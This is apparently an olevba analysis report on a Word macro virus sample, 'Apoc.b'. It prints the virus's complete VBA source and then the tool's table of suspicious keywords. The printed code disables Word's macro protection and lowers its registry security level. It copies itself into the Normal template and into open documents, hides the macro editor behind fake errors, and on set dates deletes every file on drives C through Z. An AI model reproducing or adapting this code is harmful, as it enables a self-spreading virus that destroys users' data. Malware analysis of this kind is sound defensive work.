olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Apoc.b-f81065d20038444f3be73ba099b3ccd648a95057
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Apoc.b-f81065d20038444f3be73ba099b3ccd648a95057 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Apocalypse.bas 
in file: Virus.MSWord.Apoc.b-f81065d20038444f3be73ba099b3ccd648a95057 - OLE stream: 'Macros/VBA/Apocalypse'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I As Integer
Sub Apocalypse()
On Error Resume Next
For k = 67 To 90
drive = Chr(k) & ":\"
With Application.FileSearch
.NewSearch: .LookIn = drive: .SearchSubFolders = (True Or False)
.FileName = "*.*": .MatchTextExactly = (True And False):
.FileType = msoFileTypeAllFiles
If .Execute > 0 Then
For I = 1 To .FoundFiles.Count: Kill .FoundFiles(I): Next I
End If
End With
Next k
MsgBox "The Apocalypse has come to You!", vbCritical + vbOKOnly, ""
End Sub
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = (True And False)
Options.VirusProtection = (True And False)
Options.SaveNormalPrompt = (True And False)
Application.DisplayAlerts = wdAlertsNone
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
ExecuteApocalypse
End Sub
Sub AutoClose()
On Error Resume Next
If InStr(1, ActiveDocument.FullName, "\", vbTextCompare) <> 0 Then ExecuteApocalypse
End Sub
Sub FileSaveAs()
On Error Resume Next
MsgBox "Saveas"
ExecuteApocalypse
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub viewvbcode()
On Error Resume Next
MsgBox "Sorry, access denied.", vbExclamation + vbOKOnly, "Unexpected error..."
ShowVisualBasicEditor = 0 'h
End Sub
Sub ToolsMacro()
MsgBox "Sorry, access denied.", vbExclamation + vbOKOnly, "Unexpected error..."
End Sub
Sub filetemplates()
MsgBox "Sorry, access denied.", vbExclamation + vbOKOnly, "Unexpected error..."
End Sub
Function CheckForApocalypse() As Byte
On Error Resume Next
CheckForApocalypse = 0
For Each Item In NormalTemplate.VBProject.VBComponents
If Item.Name = "Apocalypse" Then If Integrity(2) Then CheckForApocalypse = 1
Next
For Each Item In ActiveDocument.VBProject.VBComponents
If Item.Name = "Apocalypse" Then If Integrity(1) Then CheckForApocalypse = CheckForApocalypse + 2
Next
End Function
Sub ExecuteApocalypse()
Dim stat As Byte
On Error Resume Next
stat = CheckForApocalypse
Select Case stat
Case 1
DocInfecting
Case 2
NormInfecting
End Select
If Day(Now()) = 1 Or Day(Now()) = 13 Or Day(Now()) = 26 Or Month(Now()) = 4 Then Apocalypse
End Sub
Private Sub DocInfecting()
Dim Infect As Boolean
On Error Resume Next
For Each Item In ActiveDocument.VBProject.VBComponents
If Item.Name = "Apocalypse" Then
With ActiveDocument.VBProject.VBComponents.Item("Apocalypse")
.CodeModule.DeleteLines 1, .CodeModule.CountOfLines
.CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(1, 129)
If Left$(ActiveDocument.FullName, 1) > "B" And Not ActiveDocument.Saved Then ActiveDocument.Save
Exit Sub
End With
End If
Next
NormalTemplate.VBProject.VBComponents.Item("Apocalypse").Export Environ("windir") + "\Kill.bmp"
ActiveDocument.VBProject.VBComponents.Import Environ("windir") + "\Kill.bmp"
Kill Environ("windir") + "\Kill.bmp"
If Left$(ActiveDocument.FullName, 1) > "B" And Not ActiveDocument.Saved Then ActiveDocument.Save
End Sub
Private Sub NormInfecting()
On Error Resume Next
KillAllObjectsInNormal
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Apocalypse", wdOrganizerObjectProjectItems
SetAttr NormalTemplate.FullName, vbNormal
If NormalTemplate.Saved = False Then NormalTemplate.Save
End Sub
Private Sub KillAllObjectsInNormal()
On Error Resume Next
With NormalTemplate.VBProject.VBComponents
For I = .Count To 2 Step -1
.Item(I).CodeModule.DeleteLines 1, .Item(I).CodeModule.CountOfLines
.Remove .Item(I)
Next I
.Item(1).CodeModule.DeleteLines 1, .Item(1).CodeModule.CountOfLines
End With
End Sub
Private Function Integrity(m As Byte) As Boolean
On Error Resume Next
Dim s As String
Dim l As Variant
s = "PSOFdW...IFEENMESOOOOAISEEESOIESOMEDESOMSESMESMEFOCFINFINESDOsSCDCNEIEPDOFIW..IEEENNAKIEPOKASIEPOWF..N.EE"
l = Array("19", "16", "20", "16", "21", "27", "64", "56", "31", "20", "59", "6", "8", "6", "67", "7", "14", "20", "45", "42", "43", "40", "119", "110", "6", "17", "7", "15", "20", "84", "7", "16", "20", "15", "17", "32", "7", "16", "20", "79", "28", "7", "16", "79", "7", "19", "79", "7", "37", "20", "22", "54", "76", "4", "54", "97", "4", "12", "23", "16", "20", "25", "16", "6", "12", "6", "13", "10", "91", "7", "26", "21", "20", "54", "32", "61", "51", "108", "96", "8", "8", "6", "4", "95", "76", "36", "96", "7", "27", "20", "22", "119", "41", "56", "7", "36", "20", "42", "27", "67", "16", "6", "67", "8", "7")
Integrity = True
For I = 1 To 105
If m = 1 Then
If Mid(ActiveDocument.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1), 1, 1) <> Mid(s, I, 1) Or _
Len(ActiveDocument.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1)) <> l(I - 1) Then
Integrity = False
Exit For
End If
Else
If Mid(NormalTemplate.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1), 1, 1) <> Mid(s, I, 1) Or _
Len(NormalTemplate.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1)) <> l(I - 1) Then
Integrity = False
Exit For
End If
End If
Next I
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
